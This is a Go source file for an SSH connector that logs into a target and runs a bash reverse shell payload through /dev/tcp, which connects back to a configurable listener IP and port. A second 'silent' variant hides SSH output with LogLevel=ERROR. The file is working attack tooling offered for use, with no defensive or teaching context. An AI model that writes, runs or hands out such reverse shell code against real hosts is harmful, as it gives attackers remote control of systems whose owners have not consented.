package ssh

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// SSHConnector handles SSH connections with automatic reverse shell
type SSHConnector struct {
	ListenerIP   string
	ListenerPort int
}

// NewSSHConnector creates a new SSH connector
func NewSSHConnector(ip string, port int) *SSHConnector {
	return &SSHConnector{
		ListenerIP:   ip,
		ListenerPort: port,
	}
}

// Connect establishes SSH connection and executes reverse shell payload
// Format: ssh user@host or ssh user@host:port
func (s *SSHConnector) Connect(target string) error {
	// Parse target: user@host or user@host:port
	parts := strings.Split(target, "@")
	if len(parts) != 2 {
		return fmt.Errorf("invalid SSH target format. Use: user@host or user@host:port")
	}

	user := parts[0]
	hostAndPort := parts[1]

	// Check if port is specified
	sshTarget := fmt.Sprintf("%s@%s", user, hostAndPort)

	// Generate the reverse shell payload
	payload := s.generatePayload()

	// Build SSH command
	// ssh -t forces pseudo-terminal allocation (needed for interactive shells)
	// We execute the payload directly
	sshCmd := exec.Command("ssh", "-t", sshTarget, payload)

	// Connect stdin/stdout/stderr to allow interaction
	sshCmd.Stdin = os.Stdin
	sshCmd.Stdout = os.Stdout
	sshCmd.Stderr = os.Stderr

	// Execute SSH command
	fmt.Printf("Connecting to %s...\n", sshTarget)
	fmt.Printf("Executing reverse shell payload to %s:%d\n", s.ListenerIP, s.ListenerPort)

	err := sshCmd.Run()
	if err != nil {
		return fmt.Errorf("SSH connection failed: %w", err)
	}

	return nil
}

// generatePayload creates the bash reverse shell payload
func (s *SSHConnector) generatePayload() string {
	// Use bash reverse shell that connects back to the listener
	// This runs in the background and exits immediately
	payload := fmt.Sprintf(
		"bash -c 'exec bash >& /dev/tcp/%s/%d 0>&1 &' && exit",
		s.ListenerIP,
		s.ListenerPort,
	)
	return payload
}

// ConnectInteractive performs silent SSH connection
func (s *SSHConnector) ConnectInteractive(target string) error {
	// Parse target
	parts := strings.Split(target, "@")
	if len(parts) != 2 {
		return fmt.Errorf("invalid SSH target format. Use: user@host or user@host:port")
	}

	user := parts[0]
	hostAndPort := parts[1]
	sshTarget := fmt.Sprintf("%s@%s", user, hostAndPort)

	// Generate payload
	payload := s.generatePayload()

	// Build and execute SSH command silently
	// -T: disable pseudo-terminal allocation (no banner)
	// -o StrictHostKeyChecking=no: auto-accept host keys (optional, for convenience)
	// -o LogLevel=ERROR: suppress SSH messages
	sshCmd := exec.Command("ssh", "-T", "-o", "LogLevel=ERROR", sshTarget, payload)
	sshCmd.Stdin = os.Stdin
	sshCmd.Stdout = os.Stdout
	sshCmd.Stderr = os.Stderr

	err := sshCmd.Run()
	if err != nil {
		return fmt.Errorf("SSH connection failed: %w", err)
	}

	return nil
}
